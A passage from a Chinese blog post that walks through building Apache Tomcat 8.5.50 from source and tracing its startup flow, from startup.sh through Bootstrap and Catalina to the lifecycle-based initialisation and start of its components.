Servlet映射器，属于Context内部的路由映射器，只负责当前Context容器的路由导航</li></ul><h2 id="手撸tomcat源码"><a href="#手撸tomcat源码" class="headerlink" title="手撸tomcat源码"></a>手撸tomcat源码</h2><h3 id="tomcat源码构建"><a href="#tomcat源码构建" class="headerlink" title="tomcat源码构建"></a>tomcat源码构建</h3><ul><li>解压源码包，进入 apache-tomcat-8.5.50-src 目录</li><li>在当前目录中创建 source 文件夹，然后将 conf、webapps 目录移动到 source 文件夹中</li><li>在当前目录下创建 pom.xml，文件内容如下：</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>project xmlns<span class="token operator">=</span><span class="token string">"http://maven.apache.org/POM/4.0.0"</span>         xmlns<span class="token operator">:</span>xsi<span class="token operator">=</span><span class="token string">"http://www.w3.org/2001/XMLSchema-instance"</span>         xsi<span class="token operator">:</span>schemaLocation<span class="token operator">=</span>"http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>maven<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>org<span class="token operator">/</span>POM<span class="token operator">/</span><span class="token number">4.0</span><span class="token number">.0</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>maven<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>org<span class="token operator">/</span>xsd<span class="token operator">/</span>maven<span class="token operator">-</span><span class="token number">4.0</span><span class="token number">.0</span><span class="token punctuation">.</span>xsd"<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>modelVersion<span class="token punctuation">&gt;</span></span><span class="token number">4.0</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>modelVersion<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.50</span><span class="token operator">-</span>src<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>name<span class="token punctuation">&gt;</span></span><span class="token class-name">Tomcat8</span><span class="token number">.5</span><span class="token operator">&lt;</span><span class="token operator">/</span>name<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">8.5</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>build<span class="token punctuation">&gt;</span></span>        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>指定源目录<span class="token operator">--</span><span class="token operator">&gt;</span>        <span class="token generics"><span class="token punctuation">&lt;</span>finalName<span class="token punctuation">&gt;</span></span><span class="token class-name">Tomcat8</span><span class="token number">.5</span><span class="token operator">&lt;</span><span class="token operator">/</span>finalName<span class="token operator">&gt;</span>        <span class="token generics"><span class="token punctuation">&lt;</span>sourceDirectory<span class="token punctuation">&gt;</span></span>java<span class="token operator">&lt;</span><span class="token operator">/</span>sourceDirectory<span class="token operator">&gt;</span>        <span class="token generics"><span class="token punctuation">&lt;</span>resources<span class="token punctuation">&gt;</span></span>            <span class="token generics"><span class="token punctuation">&lt;</span>resource<span class="token punctuation">&gt;</span></span>                <span class="token generics"><span class="token punctuation">&lt;</span>directory<span class="token punctuation">&gt;</span></span>java<span class="token operator">&lt;</span><span class="token operator">/</span>directory<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span><span class="token operator">/</span>resource<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>resources<span class="token operator">&gt;</span>        <span class="token generics"><span class="token punctuation">&lt;</span>plugins<span class="token punctuation">&gt;</span></span>            <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>引入编译插件<span class="token operator">--</span><span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>plugin<span class="token punctuation">&gt;</span></span>                <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>maven<span class="token punctuation">.</span>plugins<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>                <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>maven<span class="token operator">-</span>compiler<span class="token operator">-</span>plugin<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>                <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">3.1</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>                <span class="token generics"><span class="token punctuation">&lt;</span>configuration<span class="token punctuation">&gt;</span></span>                    <span class="token generics"><span class="token punctuation">&lt;</span>encoding<span class="token punctuation">&gt;</span></span>UTF<span class="token operator">-</span><span class="token number">8</span><span class="token operator">&lt;</span><span class="token operator">/</span>encoding<span class="token operator">&gt;</span>                    <span class="token generics"><span class="token punctuation">&lt;</span>source<span class="token punctuation">&gt;</span></span><span class="token number">11</span><span class="token operator">&lt;</span><span class="token operator">/</span>source<span class="token operator">&gt;</span>                    <span class="token generics"><span class="token punctuation">&lt;</span>target<span class="token punctuation">&gt;</span></span><span class="token number">11</span><span class="token operator">&lt;</span><span class="token operator">/</span>target<span class="token operator">&gt;</span>                <span class="token operator">&lt;</span><span class="token operator">/</span>configuration<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span><span class="token operator">/</span>plugin<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>plugins<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>build<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>tomcat依赖的基础包<span class="token operator">--</span><span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>dependencies<span class="token punctuation">&gt;</span></span>        <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>            <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>easymock<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>easymock<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">3.4</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>        <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>            <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>ant<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>ant<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>        <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>            <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>wsdl4j<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>wsdl4j<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">1.6</span><span class="token number">.2</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>        <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>            <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>javax<span class="token punctuation">.</span>xml<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>jaxrpc<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">1.1</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>        <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>            <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>eclipse<span class="token punctuation">.</span>jdt<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compiler<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>ecj<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">4.5</span><span class="token number">.1</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>        <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>            <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>soap<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>soap<span class="token operator">-</span>api<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>            <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">1.4</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>dependencies<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>project<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>搜索Bootstrap类的main方法，运行，根据报错使用idea自动修补报错，然后给 tomcat 的源码程序启动类 Bootstrap 配置VM参数（注意路径需要修改为自己的项目位置），因为 tomcat 源码运行也需要加载配置文件等。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">-</span><span class="token class-name">Dcatalina</span><span class="token punctuation">.</span>home<span class="token operator">=</span><span class="token class-name">C</span><span class="token operator">:</span><span class="token operator">/</span><span class="token class-name">Users</span><span class="token operator">/</span><span class="token number">86178</span><span class="token operator">/</span><span class="token class-name">Desktop</span><span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.50</span><span class="token operator">-</span>src<span class="token operator">/</span>source<span class="token operator">-</span><span class="token class-name">Dcatalina</span><span class="token punctuation">.</span>base<span class="token operator">=</span><span class="token class-name">C</span><span class="token operator">:</span><span class="token operator">/</span><span class="token class-name">Users</span><span class="token operator">/</span><span class="token number">86178</span><span class="token operator">/</span><span class="token class-name">Desktop</span><span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.50</span><span class="token operator">-</span>src<span class="token operator">/</span>source<span class="token operator">-</span><span class="token class-name">Djava</span><span class="token punctuation">.</span>util<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>manager<span class="token operator">=</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>juli<span class="token punctuation">.</span></span>ClassLoaderLogManager</span><span class="token operator">-</span><span class="token class-name">Djava</span><span class="token punctuation">.</span>util<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>config<span class="token punctuation">.</span>file<span class="token operator">=</span><span class="token class-name">C</span><span class="token operator">:</span><span class="token operator">/</span><span class="token class-name">Users</span><span class="token operator">/</span><span class="token number">86178</span><span class="token operator">/</span><span class="token class-name">Desktop</span><span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.50</span><span class="token operator">-</span>src<span class="token operator">/</span>source<span class="token operator">/</span>conf<span class="token operator">/</span>logging<span class="token punctuation">.</span>properties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最后还需要在 ContextConfig 类中的 configureStart 方法中增加一行代码将 Jsp 引擎初始化，如下</p><p><img src="https://s2.loli.net/2022/05/03/RA56ZtSwcxWDbqf.png" alt="image-20220503205233975"></p><p>重新跑一遍，启动正常。访问127.0.0.1:8080成功。</p><h3 id="tomcat启动流程分析"><a href="#tomcat启动流程分析" class="headerlink" title="tomcat启动流程分析"></a>tomcat启动流程分析</h3><h4 id="tomcat启动入口"><a href="#tomcat启动入口" class="headerlink" title="tomcat启动入口"></a>tomcat启动入口</h4><p>在tomcat源码下有个bin文件夹，其中包含了适用于各平台的启动脚本</p><p><img src="https://s2.loli.net/2022/05/03/MIBayGgHwtTcnRW.png" alt="image-20220503205506459"></p><p>我们看看Linux下的stratup.sh：</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">os400=falsecase "`uname`" inOS400*) os400=true;;esac# resolve links - $0 may be a softlinkPRG="$0"while [ -h "$PRG" ] ; do  ls=`ls -ld "$PRG"`  link=`expr "$ls" : '.*-&gt; \(.*\)$'`  if expr "$link" : '/.*' &gt; /dev/null; then    PRG="$link"  else    PRG=`dirname "$PRG"`/"$link"  fidonePRGDIR=`dirname "$PRG"`EXECUTABLE=catalina.sh# Check that target executable existsif $os400; then  # -x will Only work on the os400 if the files are:  # 1. owned by the user  # 2. owned by the PRIMARY group of the user  # this will not work if the user belongs in secondary groups  evalelse  if [ ! -x "$PRGDIR"/"$EXECUTABLE" ]; then    echo "Cannot find $PRGDIR/$EXECUTABLE"    echo "The file is absent or does not have execute permission"    echo "This file is needed to run this program"    exit 1  fifiexec "$PRGDIR"/"$EXECUTABLE" start "$@"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后就是执行了<code>catalina.sh start</code>。我们再去看看<code>catalina.sh</code>的内容：</p><p>核心内容如下图所示：</p><p><img src="https://s2.loli.net/2022/05/05/wUPtkC976XAOec4.png" alt="image-20220505162855936"></p><p>附加了很多JVM参数之后执行了Bootstrap类，就来到了Bootstrap类的main方法，也即是tomcat的启动入口。</p><h4 id="Bootstrap逐级初始化"><a href="#Bootstrap逐级初始化" class="headerlink" title="Bootstrap逐级初始化"></a>Bootstrap逐级初始化</h4><p>我们来看看Bootstrap类的main方法：</p><p><img src="https://s2.loli.net/2022/05/09/UaZx5ijsNVuo3c4.png" alt="image-20220509101434791"></p><p>先实例化一个Bootstrap类，然后执行了bootstrap.init方法进行初始化。我们跟入看看init方法的具体代码及其实现：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token function">initClassLoaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setContextClassLoader</span><span class="token punctuation">(</span>catalinaLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">SecurityClassLoad</span><span class="token punctuation">.</span><span class="token function">securityClassLoad</span><span class="token punctuation">(</span>catalinaLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Load our startup class and call its process() method</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            log<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Loading startup class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> startupClass <span class="token operator">=</span> catalinaLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.startup.Catalina"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> startupInstance <span class="token operator">=</span> startupClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Set the shared extensions class loader</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            log<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Setting startup class properties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> methodName <span class="token operator">=</span> <span class="token string">"setParentClassLoader"</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> paramTypes<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        paramTypes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> paramValues<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        paramValues<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> sharedLoader<span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span>            startupInstance<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>methodName<span class="token punctuation">,</span> paramTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>startupInstance<span class="token punctuation">,</span> paramValues<span class="token punctuation">)</span><span class="token punctuation">;</span>        catalinaDaemon <span class="token operator">=</span> startupInstance<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先执行了<code>initClassLoaders();</code>方法，进行类加载器的初始化。在此方法中创建了<code>commonLoader</code>,<code>catalinaLoader</code>,<code>sharedLoader</code>。创建类加载器的方法名叫<code>createClassLoader</code>，其中<code>commonLoader</code>创建失败时会使用反射重新创建。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>commonLoader <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    commonLoader <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里有tomcat类加载机制的相关知识需要学习。挂一些链接有空总结吧</p><ul><li><a href="https://www.cnblogs.com/aspirant/p/8991830.html">https://www.cnblogs.com/aspirant/p/8991830.html</a></li><li><a href="https://cloud.tencent.com/developer/article/1687353">https://cloud.tencent.com/developer/article/1687353</a></li><li><a href="https://juejin.cn/post/6844903550300979214">https://juejin.cn/post/6844903550300979214</a></li></ul><p>接着看init方法：我们看到了熟悉的反射操作，反射获取<code>Catalina</code>类并且进行实例化</p><p><img src="https://s2.loli.net/2022/05/09/ZnYIKMfFiSXDjsA.png" alt="image-20220509110043884"></p><p>接着反射调用<code>Catalina</code>类中的<code>setParentClassLoader</code>类，最后将实例化后的对象<code>startupInstance</code>赋值给<code>catalinaDaemon</code>，init方法结束。</p><p>回到main函数中，将初始化完成的Bootstrap实例化对象bootstrap赋值给daemon。接着对daemon进行操作（daemon是Bootstrap类的实例）。看到下面的try里一堆if判断匹配参数，我们启动tomcat给的参数肯定是start，于是跳到start：</p><p><img src="https://s2.loli.net/2022/05/09/qmwE14lJshBNDFa.png" alt="image-20220509113013163"></p><p>主要执行了load和start方法。在 load 方法中实际是使用反射调用了 <em>Catalina.load()</em> 方法。这个load方法实际上就是tomcat逐级初始化的主要方法，也是我们重点关注的方法。</p><p>我们定位到<code>Catalina#load</code>方法，第一个try-catch是对配置文件进行一些操作，直到其结束后进行了<code>getServer</code>方法中的操作：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">getServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setCatalina</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//getServer方法</span><span class="token function">getServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setCatalinaHome</span><span class="token punctuation">(</span><span class="token class-name">Bootstrap</span><span class="token punctuation">.</span><span class="token function">getCatalinaHomeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setCatalinaBase</span><span class="token punctuation">(</span><span class="token class-name">Bootstrap</span><span class="token punctuation">.</span><span class="token function">getCatalinaBaseFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>getServer()</em> 返回的是一个 <em>StandardServer</em> 对象，分别对该对象设置了<em>Catalina</em> 对象、<em>catalinaHome</em> 和 <em>catalinaBase</em> 属性，<em>catalinahome</em> 是咱们 tomcat 的安装目录，<em>catalinabase</em> 是工作目录，其实这两个都是我们在构建源码时配置的 <em>tomcat</em> 源码下的 <em>source</em> 目录，最后关键的一步是调用了 <em>server</em> 的 <em>init</em> 方法，即 server 组件的初始化。我们进入<em>init</em>方法，可以看到此<em>init</em>方法实际上是<em>LifecycleBase</em>类的<em>init</em>方法。</p><p>进入到<em>LifecycleBase#init</em>方法中，跟进<em>initInternal();</em></p><p><img src="https://s2.loli.net/2022/05/11/Idl9p5NsSBEu872.png" alt="image-20220511210448746"></p><p>这个方法实际上是被定义于<em>StandardServer</em>，而<em>StandardServer</em>也是<em>LifecycleBase</em>的子类。直接跟到此方法最后，遍历所有<em>service</em>，并且进行初始化：</p><p><img src="https://s2.loli.net/2022/05/11/3AZiyOLX4SEHmMQ.png" alt="image-20220511210911641"></p><p>我们跟进此init方法，发现回到了<em>LifecycleBase</em>中的init方法。再次步入到其<code>initInternal</code>方法中，回到了<code>StandardServer</code>类下的该方法。可以看到下面有各种组件的初始化加载行为。</p><p><img src="https://s2.loli.net/2022/05/12/weshPA8JajuvUKD.png" alt="image-20220512204730730"></p><p>这些组件都有一个共性，就是都继承了 LifecycleBase 抽象类并实现了其中的抽象方法。</p><h4 id="逐级启动"><a href="#逐级启动" class="headerlink" title="逐级启动"></a>逐级启动</h4><p>看完了<code>Bootstrap</code>的<em>load</em>方法，我们来看看紧接着的start方法。回到<code>Bootstrap</code>类中，跟进<code>daemon.start();</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>catalinaDaemon <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token class-name">Method</span> method <span class="token operator">=</span> catalinaDaemon<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Class</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>catalinaDaemon<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先是判断<code>Catalina</code>类的实例<code>catalinaDaemon</code>是否存在，然后使用反射调用其<em>start</em>方法。接着跟进，来到<code>Catalina#start</code>中，运行到如图位置：</p><p><img src="https://s2.loli.net/2022/05/12/kRFO4uJo3MIhcfC.png" alt="image-20220512205939182"></p><p>这里调用到了<code>getServer().start();</code>，进行初始启动。我们跟入，与load类似，<code>state</code>值为<code>INITIALIZED</code>时，会执行此类中的<code>startInternal();</code>方法。进入后遍历所有service，并且start，逐级启动。</p><p><img src="https://s2.loli.net/2022/05/12/9HnbhsMIiPFjzDw.png" alt="image-20220512210704802"></p><p><img src="https://upload-images.jianshu.io/upload_images/14795543-ff15e6b22b6c7ecc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1148/format/webp" alt="img"></p><h3 id="Lifecycle-接口"><a href="#Lifecycle-接口" class="headerlink" title="Lifecycle 接口"></a>Lifecycle 接口</h3><h4 id="生命周期机制"><a href="#生命周期机制" class="headerlink" 